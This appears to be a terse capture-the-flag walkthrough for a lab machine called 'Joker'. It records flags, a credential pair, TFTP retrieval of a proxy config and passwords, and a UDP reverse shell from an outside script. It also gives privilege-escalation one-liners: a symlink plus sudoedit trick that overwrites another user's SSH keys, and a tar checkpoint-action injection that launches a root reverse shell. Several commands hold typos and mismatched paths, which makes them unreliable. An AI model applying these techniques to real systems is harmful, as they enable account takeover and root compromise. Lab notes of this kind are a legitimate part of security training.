# About
```
* Name: Joker
* IP: 10.10.10.21
* Level: Hard
* OS: Linux
```

# Flags
```
* User: a298121179fe93f2978d3337dbd7057b
* Root: d452b7faf5fd5b30210f340ef1d4146e
```
# Creds
```
* kalamari:ihateseafood
```
# Enumeration
```
* Ports
  * 22
  * 3128

* Username
  * webmaster

* Squid proxy 3.5.12

* tftp open on port 69
* get squid.conf
* get passwords
* got shell from udp port
* use udp to get shell
* url (https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py)
```

# Privesc(Horizontal)
```
* sudo -l reveals that sudoedit can run as user alekos
* Todo
  * Get a stable shell
  * Use nano to get alekos
* mkdir /vaw/www/testing/morty && ln -s /home/alekos/.ssh/authorized_keys /var/www/testing/morty/layout.txt && sudoedit -u alkeos /var/www/*/*/layout.html
```

# Privesc (Vertical)
```
* backup takes /home/alekos/development dir every 5 mins
* symlink devel -> /root
* file are created as root
* sudo gtfo tar + 'touch -- --checkpoint=1' + 'touch -- '--checkpoint-action=exec=python shell.py' 
  shell.py = rev shell udp
```
